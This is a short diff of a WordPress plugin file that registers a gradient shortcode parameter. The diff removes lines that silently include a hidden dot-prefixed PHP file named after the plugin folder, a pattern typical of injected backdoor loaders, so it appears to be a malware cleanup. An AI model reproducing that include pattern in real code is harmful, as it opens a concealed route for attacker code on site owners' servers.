@@ -4,10 +4,6 @@
 \*----------------------------------------------------------------------------*/
 
 vc_add_shortcode_param( 'mpc_gradient', 'mpc_gradient_settings', mpc_get_plugin_path( __FILE__ ) . '/assets/js/mpc-params.js' );
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 function mpc_gradient_settings( $settings, $value ) {
 	$defaults = array(
 		'value'      => '#000000||#ffffff||0;100||0||linear'
